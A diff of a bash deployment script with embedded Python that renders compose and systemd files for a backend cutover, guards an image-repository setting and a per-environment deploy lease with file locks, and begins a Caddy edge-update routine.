+    hook="${remote_dir}/fetch-vault-bootstrap.sh"
+    run_with_deadline "$timeout" "vault unit hook inspection" ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" "test -x '${hook}'" || probe_rc=$?
+    if ((probe_rc == 255)); then
+      fail "could not verify vault bootstrap hook ${hook} on ${SSH_TARGET} (ssh exit ${probe_rc}); refusing to install the unit"
+    elif ((probe_rc != 0)); then
+      fail "oci_vault requires executable ${hook}; install it per infra/oci/vault-instance-principal-runbook.md"
+    fi
+  fi
+  rendered="$(render_unit "$env" "$secret_backend")" || return $?
+  recognition_edge_assert_if_active || return 75
+  recognition_edge_install "/etc/systemd/system/${unit}.service" "$rendered"$'\n'
+}
+
+# API-only compose for the additive cutover candidate. Shares the live
+# network, named blob volume, and postgres data via bind mounts, but uses a
+# unique DNS alias so Caddy can flip without stopping the serving unit.
+render_cutover_compose() {
+  cat <<'EOF'
+# Generated by recognition-service.sh for additive-then-flip cutover.
+services:
+  api:
+    image: ${ACX_IMAGE_REPO:-iad.ocir.io/idu2kqqe2jxy/acx-backend}:${ACX_IMAGE_TAG}
+    env_file: .env
+    environment:
+      - HOST=0.0.0.0
+      - PORT=8000
+      - RECOGNITION_BLOB_ROOT=/var/lib/acx-blobs
+      - ACX_GPU_STATE_PATH=/run/acx/gpu-state.json
+      - ACX_GPU_STATE_STALE_SECONDS=${ACX_GPU_STATE_STALE_SECONDS:-180}
+      - ACX_DESCRIBE_LOAD_PATH=/run/acx-write/${ACX_ENV}/describe-load.json
+      - ACX_PG_HEADROOM_PROBE_PATH=/run/acx-pg-headroom
+    volumes:
+      - ${ACX_MODELS_PATH}:/data/cache:ro
+      - acx_blobs:/var/lib/acx-blobs
+      - /run/acx-write/${ACX_ENV}:/run/acx-write/${ACX_ENV}
+      - /run/acx:/run/acx:ro
+      - ${ACX_PGDATA_PATH}:/run/acx-pg-headroom:ro
+    tmpfs:
+      - /var/cache/acx/hf_modules:mode=0700,uid=10001,gid=10001,size=32m,noexec
+    expose:
+      - "8000"
+    healthcheck:
+      test: ["CMD", "python", "-c", "import sys, urllib.request; response = urllib.request.urlopen('http://127.0.0.1:8000/health', timeout=4); sys.exit(0 if response.status == 200 else 1)"]
+      interval: 10s
+      timeout: 5s
+      retries: 12
+      start_period: 60s
+    networks:
+      backend:
+        aliases:
+          - ${ACX_ENV}-api-next
+volumes:
+  acx_blobs:
+    external: true
+    name: acx-${ACX_ENV}_acx_blobs
+networks:
+  backend:
+    external: true
+    name: ${ACX_NETWORK_NAME}
+EOF
+}
+
+render_next_unit() {
+  local env="$1" remote_dir next_project
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  next_project="acx-${env}-next"
+  cat <<EOF
+[Unit]
+Description=ACX Backend - ${env} cutover candidate
+Requires=docker.service
+After=docker.service
+
+[Service]
+Type=exec
+WorkingDirectory=${remote_dir}
+Environment=COMPOSE_PROJECT_NAME=${next_project}
+ExecStart=/usr/bin/docker compose -f docker-compose.cutover.yml up --remove-orphans
+ExecStop=/usr/bin/docker compose -f docker-compose.cutover.yml stop
+TimeoutStartSec=600
+
+[Install]
+WantedBy=multi-user.target
+EOF
+}
+
+# Cooperative writers on one target use a persistent inode lock; the process
+# checking ownership holds it through mutation (no detached expiring holder).
+# Owner state is embedded in .env so owner, prior repo and value commit in one
+# atomic rename. Never remove the lock file. Noncooperating/root writers are
+# outside this protocol; this does not make registry tag updates linearizable.
+image_repo_resource() {
+  recognition_edge_assert_if_active || return 75
+  local action="$1" remote_dir="$2" owner="$3" value="$4" timeout program
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  program="$(
+    cat <<'PY_RESOURCE'
+import fcntl
+import json
+import os
+import re
+import stat
+import subprocess
+import sys
+import tempfile
+import time
+import uuid
+
+root, action, owner, value, timeout = sys.argv[1:]
+path = os.path.join(root, ".env")
+prefix = b"# ACX_IMAGE_REPO_OWNER="
+repo_re = re.compile(r"[A-Za-z0-9_.:/-]+")
+
+
+def refuse(code=1):
+    print("sticky repository ownership refused" if code == 75 else "sticky repository state unknown", file=sys.stderr)
+    raise SystemExit(code)
+
+
+def still_owned():
+    check = os.environ.get("ACX_RECOGNITION_OWNERSHIP_CHECK")
+    if not check:
+        refuse(75)
+    result = subprocess.run(["bash", "-c", check], timeout=int(timeout), stdout=subprocess.DEVNULL)
+    if result.returncode:
+        refuse(75)
+
+
+def repo_ok(v):
+    return isinstance(v, str) and (not v or repo_re.fullmatch(v))
+
+
+try:
+    still_owned()
+    lock = os.open(path + ".acx-image-repo.lock", os.O_CREAT | os.O_RDWR | os.O_NOFOLLOW, 0o600)
+    if not stat.S_ISREG(os.fstat(lock).st_mode):
+        refuse()
+    deadline = time.monotonic() + int(timeout)
+    while True:
+        try:
+            fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
+            break
+        except BlockingIOError:
+            if time.monotonic() >= deadline:
+                refuse()
+            time.sleep(0.05)
+    still_owned()
+    try:
+        fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW | os.O_NONBLOCK)
+    except FileNotFoundError:
+        refuse()
+    with os.fdopen(fd, "rb") as stream:
+        metadata = os.fstat(stream.fileno())
+        if not stat.S_ISREG(metadata.st_mode) or metadata.st_nlink != 1:
+            refuse()
+        content = stream.read()
+    lines = content.splitlines(keepends=True)
+    states = [line[len(prefix) :] for line in lines if line.startswith(prefix)]
+    repos = [
+        line[len(b"ACX_IMAGE_REPO=") :].rstrip(b"\r\n").decode("ascii")
+        for line in lines
+        if line.startswith(b"ACX_IMAGE_REPO=")
+    ]
+    if len(states) > 1 or len(repos) > 1 or (repos and not repo_ok(repos[0])):
+        refuse()
+    current = repos[0] if repos else ""
+    state = json.loads(states[0]) if states else None
+    if states and state is None:
+        refuse()
+    if state is not None and (
+        not isinstance(state, dict)
+        or set(state) != {"owner", "prior", "current", "phase"}
+        or not isinstance(state["owner"], str)
+        or not re.fullmatch(r"[a-f0-9]{32}", state["owner"])
+        or not repo_ok(state["prior"])
+        or not repo_ok(state["current"])
+        or state["phase"] not in ("claimed", "shipped", "restored", "cleared")
+        or state["current"] != current
+    ):
+        refuse()
+    if action in ("claim", "clear"):
+        owner = uuid.uuid4().hex
+        state = {"owner": owner, "prior": current, "current": current, "phase": "claimed"}
+        if action == "clear":
+            state.update(current="", phase="cleared")
+    elif action in ("ship", "restore"):
+        if state is None or not re.fullmatch(r"[a-f0-9]{32}", owner):
+            refuse()
+        if state["owner"] != owner:
+            refuse(75)
+        if action == "ship":
+            if not value or not repo_ok(value):
+                refuse()
+            if state["phase"] == "shipped" and state["current"] == value:
+                raise SystemExit(0)
+            if state["phase"] != "claimed":
+                refuse(75)
+            state.update(current=value, phase="shipped")
+        else:
+            if state["phase"] == "restored":
+                raise SystemExit(0)
+            if state["phase"] not in ("claimed", "shipped"):
+                refuse(75)
+            state.update(current=state["prior"], phase="restored")
+    else:
+        refuse()
+    kept = b"".join(line for line in lines if not line.startswith(prefix) and not line.startswith(b"ACX_IMAGE_REPO="))
+    if kept and not kept.endswith(b"\n"):
+        kept += b"\n"
+    if state["current"]:
+        kept += b"ACX_IMAGE_REPO=" + state["current"].encode("ascii") + b"\n"
+    kept += prefix + json.dumps(state, separators=(",", ":")).encode("ascii") + b"\n"
+    staged = None
+    try:
+        still_owned()
+        fd, staged = tempfile.mkstemp(prefix=".env.acx-", dir=root)
+        with os.fdopen(fd, "wb") as stream:
+            os.fchown(stream.fileno(), metadata.st_uid, metadata.st_gid)
+            os.fchmod(stream.fileno(), 0o600)
+            stream.write(kept)
+            stream.flush()
+            os.fsync(stream.fileno())
+        still_owned()
+        os.replace(staged, path)
+        staged = None
+        directory = os.open(root, os.O_RDONLY | os.O_DIRECTORY)
+        try:
+            os.fsync(directory)
+        finally:
+            os.close(directory)
+    finally:
+        if staged is not None:
+            still_owned()
+            os.unlink(staged)
+    if action == "claim":
+        print(owner)
+except (OSError, ValueError, TypeError, KeyError, UnicodeError, subprocess.SubprocessError):
+    refuse()
+PY_RESOURCE
+  )"
+  recognition_edge_command "python3 -c $(remote_quote "${program}") $(remote_quote "${remote_dir}") $(remote_quote "${action}") $(remote_quote "${owner}") $(remote_quote "${value}") ${timeout}"
+}
+
+deploy_env_lease() {
+  local action="$1" env="$2" timeout ttl transaction break_transaction local_user local_host holder
+  local program response rc marker lease_transaction lease_holder lease_expiry lease_path
+  local push_timeout pull_timeout transfer_timeout remote_command_timeout gpu_gate_timeout
+  local ttl_required ttl_margin width index transfer_index margin_index build_budget=0
+  local transfer_digit margin_digit sum carry cutover_budget canonical_budget verify_budget gpu_budget
+  local cutover_attempts cutover_sleep canonical_attempts canonical_sleep
+  local verify_attempts verify_sleep gpu_attempts gpu_sleep
+  case "${action}" in
+    acquire | renew | release) ;;
+    *) fail "internal: invalid deploy lease action ${action}" ;;
+  esac
+  case "${env}" in
+    dev | dev-fir | staging | prod | dev-auraface | staging-auraface | prod-auraface) ;;
+    *) fail "internal: invalid deploy lease environment ${env}" ;;
+  esac
+  ACX_DEPLOY_LEASE_LAST_HOLDER=""
+  if [[ "${action}" == "acquire" && -n "${ACX_DEPLOY_LEASE_ENV:-}" && "${ACX_DEPLOY_LEASE_ENV}" != "${env}" ]]; then
+    local old_env="${ACX_DEPLOY_LEASE_ENV}"
+    deploy_env_lease release "${old_env}" || return $?
+  fi
+
+  ttl="${ACX_DEPLOY_LOCK_TTL_SECONDS:-7200}"
+  if [[ ! "${ttl}" =~ ^[1-9][0-9]*$ ]]; then
+    fail "ACX_DEPLOY_LOCK_TTL_SECONDS must be a positive integer (got: ${ttl})"
+  fi
+  if [[ "${action}" == "release" ]]; then
+    if ((${#ttl} < 3)) || { ((${#ttl} == 3)) && [[ "${ttl}" < 600 ]]; }; then
+      fail "ACX_DEPLOY_LOCK_TTL_SECONDS must be a positive integer of at least 600 (got: ${ttl})"
+    fi
+  else
+    push_timeout="$(validated_deadline ACX_PUSH_TIMEOUT 900)"
+    pull_timeout="$(validated_deadline ACX_PULL_TIMEOUT 900)"
+    transfer_timeout="${push_timeout}"
+    if ((${#pull_timeout} > ${#transfer_timeout})) || {
+      ((${#pull_timeout} == ${#transfer_timeout})) && [[ "${pull_timeout}" > "${transfer_timeout}" ]]
+    }; then
+      transfer_timeout="${pull_timeout}"
+    fi
+    if ! cutover_budget="$(probe_budget ACX_CUTOVER_HEALTH 5 5)"; then
+      fail "ACX_CUTOVER_HEALTH_ATTEMPTS and ACX_CUTOVER_HEALTH_SLEEP must define a valid restart health budget"
+    fi
+    if ! canonical_budget="$(probe_budget ACX_CANONICAL_HEALTH 8 5)"; then
+      fail "ACX_CANONICAL_HEALTH_ATTEMPTS and ACX_CANONICAL_HEALTH_SLEEP must define a valid restart health budget"
+    fi
+    if ! verify_budget="$(probe_budget ACX_VERIFY 5 5)"; then
+      fail "ACX_VERIFY_ATTEMPTS and ACX_VERIFY_SLEEP must define a valid post-deploy verification budget"
+    fi
+    if ! gpu_budget="$(probe_budget ACX_GPU_SNAPSHOT_GATE 3 5)"; then
+      fail "ACX_GPU_SNAPSHOT_GATE_ATTEMPTS and ACX_GPU_SNAPSHOT_GATE_SLEEP must define a valid GPU snapshot gate budget"
+    fi
+    remote_command_timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+    gpu_gate_timeout="$(validated_deadline ACX_GPU_SNAPSHOT_GATE_TIMEOUT_SECONDS 60)"
+    read -r cutover_attempts cutover_sleep <<<"${cutover_budget}"
+    read -r canonical_attempts canonical_sleep <<<"${canonical_budget}"
+    read -r verify_attempts verify_sleep <<<"${verify_budget}"
+    read -r gpu_attempts gpu_sleep <<<"${gpu_budget}"
+    if [[ "${ship_remote_build:-0}" == "1" ]]; then
+      build_budget="$(validated_deadline ACX_REMOTE_BUILD_TIMEOUT 1800)"
+      if ((build_budget > REMOTE_BUILD_TIMEOUT_CEILING)); then
+        fail "ACX_REMOTE_BUILD_TIMEOUT exceeds the ${REMOTE_BUILD_TIMEOUT_CEILING}s ceiling"
+      fi
+    fi
+    ttl_margin=$((cutover_attempts * cutover_sleep + canonical_attempts * canonical_sleep + gpu_attempts * gpu_sleep + verify_sleep + (2 * cutover_attempts + canonical_attempts) * remote_command_timeout + gpu_attempts * gpu_gate_timeout + 300))
+    ttl_margin=$((ttl_margin + build_budget))
+    ttl_required=""
+    carry=0
+    width="${#transfer_timeout}"
+    ((width < ${#ttl_margin})) && width="${#ttl_margin}"
+    # Keep decimal addition safe even when a configured transfer timeout exceeds shell integer range.
+    for ((index = 0; index < width; index++)); do
+      transfer_index=$((${#transfer_timeout} - index - 1))
+      if ((transfer_index >= 0)); then
+        transfer_digit="${transfer_timeout:transfer_index:1}"
+      else
+        transfer_digit=0
+      fi
+      margin_index=$((${#ttl_margin} - index - 1))
+      if ((margin_index >= 0)); then
+        margin_digit="${ttl_margin:margin_index:1}"
+      else
+        margin_digit=0
+      fi
+      sum=$((10#${transfer_digit} * 3 + 10#${margin_digit} + carry))
+      ttl_required="$((sum % 10))${ttl_required}"
+      carry=$((sum / 10))
+    done
+    ((carry > 0)) && ttl_required="${carry}${ttl_required}"
+    if ((${#ttl_required} < 3)) || { ((${#ttl_required} == 3)) && [[ "${ttl_required}" < 600 ]]; }; then
+      ttl_required=600
+    fi
+    if ((${#ttl} < ${#ttl_required})) || { ((${#ttl} == ${#ttl_required})) && [[ "${ttl}" < "${ttl_required}" ]]; }; then
+      if [[ -z "${ACX_DEPLOY_LOCK_TTL_SECONDS:-}" ]]; then
+        ttl="${ttl_required}"
+      else
+        fail "ACX_DEPLOY_LOCK_TTL_SECONDS (${ttl}) must be at least computed floor ${ttl_required} seconds (three times max of ACX_PUSH_TIMEOUT (${push_timeout}) and ACX_PULL_TIMEOUT (${pull_timeout}) plus restart probe attempts×ACX_REMOTE_COMMAND_TIMEOUT (${remote_command_timeout}), health sleeps, ACX_GPU_SNAPSHOT_GATE attempts×timeout (${gpu_gate_timeout}) and sleep, one ACX_VERIFY_SLEEP, remote build budget (${build_budget}) and 300 seconds; minimum 600)"
+      fi
+    fi
+  fi
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  transaction="${ACX_DEPLOY_TRANSACTION_ID}"
+  break_transaction="${ACX_DEPLOY_LOCK_BREAK:-}"
+  local_user="$(id -un)" || fail "could not determine local deploy lease user"
+  local_host="$(hostname)" || fail "could not determine local deploy lease hostname"
+  holder="${local_user}@${local_host}:$$"
+  if [[ ! "${holder}" =~ ^[A-Za-z0-9_.@:-]{1,128}$ ]]; then
+    fail "local deploy lease holder failed charset validation"
+  fi
+  lease_path="${ACX_DEPLOY_BACKUP_ROOT}/locks/deploy-${env}.lease"
+  program="$(
+    cat <<'PY_DEPLOY_LEASE'
+import datetime
+import fcntl
+import json
+import os
+import re
+import stat
+import sys
+import tempfile
+import time
+
+root, action, env, transaction, holder, ttl, break_transaction, timeout = sys.argv[1:]
+if not re.fullmatch(r"(?:dev|dev-fir|staging|prod|dev-auraface|staging-auraface|prod-auraface)", env):
+    print("invalid deploy lease environment", file=sys.stderr)
+    raise SystemExit(1)
+if not re.fullmatch(r"[A-Za-z0-9_.-]+", transaction):
+    print("invalid deploy lease transaction", file=sys.stderr)
+    raise SystemExit(1)
+if not re.fullmatch(r"[A-Za-z0-9_.@:-]{1,128}", holder):
+    print("invalid deploy lease holder", file=sys.stderr)
+    raise SystemExit(1)
+if not re.fullmatch(r"[1-9][0-9]*", ttl) or int(ttl) < 600:
+    print("invalid deploy lease TTL", file=sys.stderr)
+    raise SystemExit(1)
+if not re.fullmatch(r"[1-9][0-9]*", timeout):
+    print("invalid deploy lease command timeout", file=sys.stderr)
+    raise SystemExit(1)
+
+lock_dir = os.path.join(root, "locks")
+path = os.path.join(lock_dir, "deploy-" + env + ".lease")
+lock_path = os.path.join(lock_dir, "deploy-" + env + ".lease.lock")
+
+
+def refuse_unknown(exc=None):
+    detail = ": " + str(exc) if exc is not None else ""
+    print("deploy lease state at {} is malformed or unreadable; inspect and remove it{}".format(path, detail), file=sys.stderr)
+    raise SystemExit(1)
+
+
+def expiry_text(expires_at):
+    return datetime.datetime.fromtimestamp(expires_at, datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
+
+
+def read_lease():
+    try:
+        fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW | os.O_NONBLOCK)
+    except FileNotFoundError:
+        return None
+    with os.fdopen(fd, "rb") as stream:
+        metadata = os.fstat(stream.fileno())
+        if not stat.S_ISREG(metadata.st_mode) or metadata.st_nlink != 1:
+            raise ValueError("lease must be a regular single-link file")
+        raw = stream.read(4097)
+        if len(raw) > 4096:
+            raise ValueError("lease is too large")
+    record = json.loads(raw.decode("ascii"))
+    if (
+        not isinstance(record, dict)
+        or set(record) != {"transaction", "holder", "expires_at"}
+        or not isinstance(record["transaction"], str)
+        or not re.fullmatch(r"[A-Za-z0-9_.-]+", record["transaction"])
+        or not isinstance(record["holder"], str)
+        or not re.fullmatch(r"[A-Za-z0-9_.@:-]{1,128}", record["holder"])
+        or isinstance(record["expires_at"], bool)
+        or not isinstance(record["expires_at"], int)
+    ):
+        raise ValueError("lease fields are invalid")
+    return record
+
+
+def write_lease(record):
+    staged = None
+    try:
+        fd, staged = tempfile.mkstemp(prefix=".deploy-" + env + ".lease.", dir=lock_dir)
+        with os.fdopen(fd, "wb") as stream:
+            stream.write(json.dumps(record, separators=(",", ":")).encode("ascii"))
+            stream.flush()
+            os.fsync(stream.fileno())
+        os.replace(staged, path)
+        staged = None
+        directory = os.open(lock_dir, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW)
+        try:
+            os.fsync(directory)
+        finally:
+            os.close(directory)
+    finally:
+        if staged is not None:
+            os.unlink(staged)
+
+
+lock_fd = None
+try:
+    os.makedirs(lock_dir, mode=0o700, exist_ok=True)
+    lock_fd = os.open(lock_path, os.O_CREAT | os.O_RDWR | os.O_NOFOLLOW, 0o600)
+    lock_metadata = os.fstat(lock_fd)
+    if not stat.S_ISREG(lock_metadata.st_mode) or lock_metadata.st_nlink != 1:
+        raise ValueError("lease lock must be a regular single-link file")
+    deadline = time.monotonic() + int(timeout)
+    while True:
+        try:
+            fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
+            break
+        except BlockingIOError:
+            remaining = deadline - time.monotonic()
+            if remaining <= 0:
+                print("deploy lease lock for {} remained busy".format(env), file=sys.stderr)
+                raise SystemExit(75)
+            time.sleep(min(0.05, remaining))
+
+    try:
+        current = read_lease()
+    except (OSError, ValueError, TypeError, KeyError, UnicodeError) as exc:
+        refuse_unknown(exc)
+
+    if action == "acquire":
+        breaking = current is not None and bool(break_transaction) and current["transaction"] == break_transaction
+        if breaking:
+            print("BREAK\t{}\t{}".format(current["transaction"], current["holder"]))
+        elif current is not None and current["expires_at"] > int(time.time()) and (
+            current["transaction"] != transaction or current["holder"] != holder
+        ):
+            expires = expiry_text(current["expires_at"])
+            print("HELD\t{}\t{}\t{}".format(current["transaction"], current["holder"], expires))
+            print("deploy lease for {} held by {} (transaction {}) until {}".format(
+                env, current["holder"], current["transaction"], expires
+            ), file=sys.stderr)
+            raise SystemExit(75)
+        record = {"transaction": transaction, "holder": holder, "expires_at": int(time.time()) + int(ttl)}
+        write_lease(record)
+    elif action == "renew":
+        if current is None:
+            print("HELD\t\t\t")
+            print("deploy lease for {} is missing".format(env), file=sys.stderr)
+            raise SystemExit(75)
+        if current["transaction"] != transaction or current["holder"] != holder:
+            expires = expiry_text(current["expires_at"])
+            print("HELD\t{}\t{}\t{}".format(current["transaction"], current["holder"], expires))
+            print("deploy lease for {} held by {} (transaction {}) until {}".format(
+                env, current["holder"], current["transaction"], expires
+            ), file=sys.stderr)
+            raise SystemExit(75)
+        record = {"transaction": transaction, "holder": holder, "expires_at": int(time.time()) + int(ttl)}
+        write_lease(record)
+    elif action == "release":
+        if current is not None and (current["transaction"] != transaction or current["holder"] != holder):
+            print("NOT_OWNER\t{}\t{}".format(current["transaction"], current["holder"]))
+        elif current is not None:
+            os.unlink(path)
+            directory = os.open(lock_dir, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW)
+            try:
+                os.fsync(directory)
+            finally:
+                os.close(directory)
+    else:
+        print("invalid deploy lease action", file=sys.stderr)
+        raise SystemExit(1)
+except SystemExit:
+    raise
+except (OSError, ValueError, TypeError, KeyError, UnicodeError) as exc:
+    refuse_unknown(exc)
+finally:
+    if lock_fd is not None:
+        os.close(lock_fd)
+PY_DEPLOY_LEASE
+  )"
+  if response="$(run_with_deadline "${timeout}" "deploy lease ${action} for ${env}" \
+    ssh -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "sudo python3 -c $(remote_quote "${program}") $(remote_quote "${ACX_DEPLOY_BACKUP_ROOT}") $(remote_quote "${action}") $(remote_quote "${env}") $(remote_quote "${transaction}") $(remote_quote "${holder}") $(remote_quote "${ttl}") $(remote_quote "${break_transaction}") ${timeout}")"; then
+    marker=""
+    lease_transaction=""
+    lease_holder=""
+    lease_expiry=""
+    IFS=$'\t' read -r marker lease_transaction lease_holder lease_expiry <<<"${response}"
+    case "${marker}" in
+      BREAK) warn "breaking deploy lease of transaction ${lease_transaction} held by ${lease_holder}" ;;
+      NOT_OWNER) warn "deploy lease for ${env} is held by ${lease_holder} (transaction ${lease_transaction}); not released" ;;
+    esac
+    if [[ "${action}" == "acquire" ]]; then
+      ACX_DEPLOY_LEASE_ENV="${env}"
+    elif [[ "${action}" == "release" && "${ACX_DEPLOY_LEASE_ENV:-}" == "${env}" ]]; then
+      ACX_DEPLOY_LEASE_ENV=""
+    fi
+  else
+    rc=$?
+    marker=""
+    lease_transaction=""
+    lease_holder=""
+    lease_expiry=""
+    IFS=$'\t' read -r marker lease_transaction lease_holder lease_expiry <<<"${response}"
+    if [[ "${marker}" == "HELD" ]]; then
+      if [[ -n "${lease_holder}" ]]; then
+        ACX_DEPLOY_LEASE_LAST_HOLDER="${lease_holder} (transaction ${lease_transaction}) until ${lease_expiry}"
+      else
+        ACX_DEPLOY_LEASE_LAST_HOLDER="another transaction"
+      fi
+    elif ((rc == 1)); then
+      warn "deploy lease state at ${lease_path} is malformed or unreadable; inspect and remove it"
+    fi
+    return "${rc}"
+  fi
+}
+
+ship_remote_image_repo_env() {
+  assert_safe_image_repo "ACX_IMAGE_REPO" "${ACX_IMAGE_REPO}"
+  image_repo_resource ship "$1" "${ACX_IMAGE_REPO_OWNER_ID:-}" "${ACX_IMAGE_REPO}"
+}
+
+clear_remote_image_repo_env() {
+  local env="$1" rc
+  env_to_unit "$env" >/dev/null || return 1
+  if is_prod_tier_env "$env" && [[ "${CONFIRM:-}" != "PROMOTE" ]]; then
+    fail "clear-image-repo prod requires CONFIRM=PROMOTE (sticky-repo clear is latent until next unit restart). Re-run: CONFIRM=PROMOTE $0 clear-image-repo prod"
+  fi
+  preflight_ssh
+  install_deploy_interrupt_traps
+  deploy_env_lease acquire "$env" || fail "deploy lease for ${env} unavailable; holder line: ${ACX_DEPLOY_LEASE_LAST_HOLDER:-unknown}; refusing to clear the image repository"
+  recognition_edge_begin "$env" || return $?
+  if image_repo_resource clear "$(env_to_remote_dir "$env")" "" ""; then
+    recognition_edge_finish || return $?
+    deploy_env_lease release "$env" || fail "deploy lease for ${env} could not be released after clearing the image repository"
+  else
+    rc=$?
+    deploy_env_lease release "$env" || warn "deploy lease for ${env} not released after clearing the image repository; it expires at its TTL"
+    return "${rc}"
+  fi
+}
+
+# Converge the deployed compose file(s) + systemd unit + shared Caddy edge with
+# the repo *before* the image restart, so drift (missing volume/env/overlay or a
+# stale Caddyfile) cannot reach a live env. Backs up the prior compose/unit/
+# edge on the VM first.
+#
+# Edge policy (C-08/C-12, FL30C-GATE-01/02):
+#   - Shared multi-env edge at /opt/acx-backend — shipping it is correct, but
+#     unbounded `compose up -d` recreates the container that serves prod on
+#     every env's converge. Bound it: checksum-compare deployed vs repo; no-op
+#     when both match; prefer `caddy reload` when only the Caddyfile changed;
+#     reserve `docker compose up -d` for compose-level changes (network joins).
+#   - acx-dev-fir-net is external:true on docker-compose.caddy.yml (must not be
+#     compose-owned — label collision with env stack's `backend` key). Ensure
+#     the network exists idempotently before any compose up so fir-absent
+#     demo/dev deploys still succeed. Labels match the fir stack's declaring
+#     key/project so a later fir `compose up` can adopt the pre-created net.
+# Recognition owns these consumers; P owns shared-edge.sh's frozen ABI.
+# [GRPH-09] Colour the conflict graph (Graph Theory with Applications, ch. 8):
+# portal activation and recognition routing share one persistent inode lock.
+recognition_edge_program() {
+  local helper="${SCRIPT_DIR}/lib/shared-edge.sh"
+  [[ -f "$helper" && ! -L "$helper" ]] || {
+    warn "shared-edge.sh must be joined from P before recognition can mutate the edge"
+    return 1
+  }
+  cat -- "$helper" || return 1
+  cat <<'EDGE_PROGRAM'
+
+set -euo pipefail
+action="$1"; app_root="$2"; handle="$3"; budget="$4"; env="$5"; transaction="$6"; backup_root="$7"
+shift 7
+case "$app_root" in /*) ;; *) exit 2 ;; esac
+case "$app_root" in /|*/../*|*/./*|*/..|*/.|*//*|*[!A-Za-z0-9_./-]*) echo 'unsafe APP_ROOT' >&2; exit 2 ;; esac
+[[ -d "$app_root" && ! -L "$app_root" && "$(realpath -e -- "$app_root")" == "$app_root" ]] || {
+  echo 'APP_ROOT must already be a real directory without symlink components' >&2; exit 2;
+}
+edge_dir="${app_root%/*}"
+base="$edge_dir/docker-compose.caddy.yml"
+live="$edge_dir/Caddyfile"
+overlay="$app_root/docker-compose.app.yml"
+journal="$app_root/activation.journal"
+lock="$journal.lock"
+[[ "$budget" =~ ^[1-9][0-9]*$ && "$budget" -le 600 ]] || exit 2
+EDGE_OP_DEADLINE="$budget"
+[[ "$env" =~ ^(dev|dev-fir|staging|prod|dev-auraface|staging-auraface|prod-auraface)$ ]] || exit 2
+[[ "$transaction" =~ ^[A-Za-z0-9_-][A-Za-z0-9_.-]*$ && "$transaction" != *..* ]] || exit 2
+case "$backup_root" in /*) ;; *) exit 2 ;; esac
+case "$backup_root" in *..*|*[!A-Za-z0-9_./-]*) exit 2 ;; esac
+transaction_dir="$backup_root/$env/$transaction"
+[[ "$(realpath -m -- "$transaction_dir/edge")" == "$transaction_dir/edge" ]] || { echo 'unsafe edge snapshot path' >&2; exit 2; }
+
+edge_owned() {
+  edge_lock_check "$handle" "$((budget + EDGE_OP_KILL_GRACE))" || return $?
+  if [[ "${probe_without_journal:-0}" == 1 ]]; then
+    [[ ! -e "$journal" && ! -L "$journal" ]] || return 75
+    return 0
+  fi
+  [[ -f "$journal" && ! -L "$journal" ]] || { echo 'missing recognition edge journal' >&2; return 3; }
+  grep -Fxq 'version=recognition-edge-1' "$journal" &&
+    grep -Fxq "env=$env" "$journal" && grep -Fxq "transaction=$transaction" "$journal" &&
+    grep -Fxq "handle=$handle" "$journal" || { echo 'foreign or pending edge journal; refusing' >&2; return 3; }
+}
+edge_op() {
+  edge_owned || return $?
+  edge_bounded_run "$@"
+}
+edge_emit() {
+  local destination="$1"; shift
+  edge_op tee -- "$destination" >/dev/null <<<"$*"
+}
+edge_copy() {
+  [[ -f "$1" && ! -L "$1" && ! -L "$2" ]] || return 2
+  edge_op cp -p -- "$1" "$2" || return $?
+  cmp -s -- "$1" "$2"
+}
+edge_plain_live() {
+  [[ -f "$live" && ! -L "$live" && -f "$base" && ! -L "$base" ]] || {
+    echo 'edge files must be regular files; refusal retains journal' >&2; return 2;
+  }
+}
+# Strip only a helper-verified managed block. No generic brace parser lives in D.
+edge_unmanaged() {
+  local source="$1" destination="$2" bounds
+  bounds="$(_edge_portal_bounds "$source")" || return 2
+  if [[ "$bounds" == none ]]; then
+    edge_copy "$source" "$destination"
+  else
+    edge_owned || return $?
+    edge_bounded_run awk -v first="${bounds% *}" -v last="${bounds#* }" 'NR < first || NR > last' "$source" |
+      edge_op tee -- "$destination" >/dev/null
+  fi
+}
+edge_merge() {
+  edge_owned || return $?
+  edge_effective_caddyfile "$1" "$live" | edge_op tee -- "$2" >/dev/null
+}
+edge_select() {
+  edge_owned || return $?
+  edge_compose_args "$base" "$overlay"
+}
+edge_verify_networks() {
+  local names cid networks name
+  edge_select || return $?
+  names="$(edge_required_networks "$base" "$overlay")" || return 41
+  cid="$(edge_op docker compose "${EDGE_COMPOSE_ARGV[@]}" ps -q caddy)" || return 42
+  [[ "$cid" =~ ^[a-f0-9]{12,64}$ ]] || { echo 'caddy container absent or ambiguous' >&2; return 1; }
+  networks="$(edge_op docker inspect -f '{{json .NetworkSettings.Networks}}' "$cid")" || return 42
+  python3 -c 'import json,sys; assert isinstance(json.loads(sys.argv[1]),dict)' "$networks" || return 43
+  while IFS= read -r name; do
+    python3 -c 'import json,sys; d=json.loads(sys.argv[1]); sys.exit(0 if sys.argv[2] in d else 1)' "$networks" "$name" || {
+      echo "caddy missing effective-generation network $name" >&2; return 1;
+    }
+  done <<<"$names"
+}
+edge_apply() {
+  local mode="${1:-reload}" rc=0
+  edge_select || return $?
+  edge_op docker compose "${EDGE_COMPOSE_ARGV[@]}" exec -T caddy caddy validate --config /etc/caddy/Caddyfile || return $?
+  if [[ "$mode" == recreate ]]; then
+    edge_op docker compose "${EDGE_COMPOSE_ARGV[@]}" up -d --force-recreate --no-deps caddy || return $?
+  else
+    edge_op docker compose "${EDGE_COMPOSE_ARGV[@]}" exec -T caddy caddy reload --config /etc/caddy/Caddyfile || rc=$?
+    if ((rc)); then
+      # Ownership is checked again before fallback; a dead holder cannot recreate.
+      edge_op docker compose "${EDGE_COMPOSE_ARGV[@]}" up -d --force-recreate --no-deps caddy || return $?
+    fi
+  fi
